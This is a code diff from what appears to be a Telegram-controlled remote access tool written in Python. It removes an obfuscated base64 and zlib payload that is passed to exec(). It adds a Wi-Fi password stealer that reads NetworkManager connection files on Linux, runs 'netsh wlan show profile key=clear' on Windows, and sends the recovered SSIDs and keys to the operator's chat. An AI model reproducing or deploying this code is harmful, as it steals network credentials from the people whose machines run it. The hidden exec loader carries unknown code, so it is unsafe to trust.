@@ -5,10 +5,150 @@ import config
 import constants
 import os
 import base64
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+async def stealer_callback(bot, call):
+    markup = getMarkupModes()
+
+    is_successfull, stealed_wifi = steal_wifi()
+
+    if not is_successfull:
+        await send_message(bot, call.message.chat.id, text=stealed_wifi, reply_markup=markup)
+        return
+
+    answer = constants.wifistealer_answer_message
+    for wifi, password in stealed_wifi.items():
+        answer += wifi + ' ' * \
+            (30 - ((len(wifi) - 4) * (len(wifi) > 4))) + password + '\n'
+
+    await send_message(bot, call.message.chat.id, text=answer, reply_markup=markup)
 
 
-exec((_)(b'==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'))
+async def showwifi_callback(bot, call):
+    markup = getMarkupModes()
+
+    WIFI_list = get_list_of_wifi()
+
+    await send_message(bot, call.message.chat.id, text=WIFI_list, reply_markup=markup)
+
+
+def steal_wifi():
+    if config.os_name == constants.Windows_OS:
+        stolen_passwords = steal_wifi_windows()
+    if config.os_name == constants.Linux_OS:
+        stolen_passwords = steal_wifi_linux()
+    if stolen_passwords == None:
+        return "Seems like device haven't wlan."
+    return stolen_passwords
+
+
+def steal_wifi_linux():
+    try:
+        if not config.is_root:
+            return (0, constants.TO_USE_MUST_BE_ROOT)
+
+        networks_path = '/etc/NetworkManager/system-connections/'
+        networks = os.listdir(networks_path)
+
+        datas = dict()
+        for network in networks:
+            with open(networks_path + network, encoding='cp866') as file:
+                data = file.readlines()
+
+            ssid, psk = 'No', 'No'
+            for line in data:
+                if 'ssid=' in line:
+                    ssid = line.replace('ssid=', '')
+                if 'psk=' in line:
+                    psk = line.replace('psk=', '')
+            datas[ssid.strip()] = psk
+
+        return (1, datas)
+
+    except Exception as ex:
+        return (0, 'Error: ' + str(ex))
+
+
+def steal_wifi_windows():
+    try:
+        data = Command.run_command(
+            f'netsh wlan show profiles').split('\n')
+
+        windll = ctypes.windll.kernel32
+        windll.GetUserDefaultUILanguage()
+
+        languege = locale.windows_locale[windll.GetUserDefaultUILanguage()]
+        england = {'User_profiles': 'All User Profile',
+                   'key_content': 'Key Content'}
+        rusland = {'User_profiles': base64.b64decode('0JLRgdC1INC/0YDQvtGE0LjQu9C4INC/0L7Qu9GM0LfQvtCy0LDRgtC10LvQtdC5'.encode('utf-8')).decode('utf-8'),
+                   'key_content': base64.b64decode('0KHQvtC00LXRgNC20LjQvNC+0LUg0LrQu9GO0YfQsA=='.encode('utf-8')).decode('utf-8')}
+
+        if languege == 'ru_RU':
+            wifi_lang = rusland
+        elif languege == 'en_US':
+            wifi_lang = england
+        else:
+            wifi_lang = england
+
+        wifis = [line.split(':')[1][1:]
+                 for line in data if wifi_lang['User_profiles'] in line]
+
+        datas = {}
+        for wifi in wifis:
+            results = Command.run_command(
+                f'netsh wlan show profile "{wifi}" key=clear').split('\n')
+
+            results = [line.split(':')[1][1:]
+                       for line in results if wifi_lang['key_content'] in line]
+
+            try:
+                datas[wifi] = results[0]
+
+            except:
+                datas[wifi] = "Not found"
+
+        if len(datas) == 0:
+            return (0, "Not found")
+
+        return (1, datas)
+
+    except Exception as ex:
+        return (0, 'Error: ' + str(ex))
+
+
+def get_list_of_wifi():
+    if config.os_name == constants.Windows_OS:
+        list_of_wifi = get_list_of_wifi_windows()
+    if config.os_name == constants.Linux_OS:
+        list_of_wifi = get_list_of_wifi_linux()
+    if list_of_wifi == None or list_of_wifi == '':
+        return "Seems like device haven't wlan."
+    return list_of_wifi
+
+
+def get_list_of_wifi_linux():
+    try:
+        networks = Command.run_command(
+            'nmcli device wifi list')
+
+        decoded_networks = networks
+    except Exception as ex:
+        return ex
+
+    return decoded_networks
+
+
+def get_list_of_wifi_windows():
+    try:
+        networks = Command.run_command(
+            'netsh wlan show networks')
+
+    except Exception as ex:
+        return ex
+
+    return networks
+
+
+modes = {constants.WIFI_STEALER_preview: constants.WIFI_STEALER,
+         constants.WIFI_SHOWWIFI_preview: constants.WIFI_SHOWWIFI}
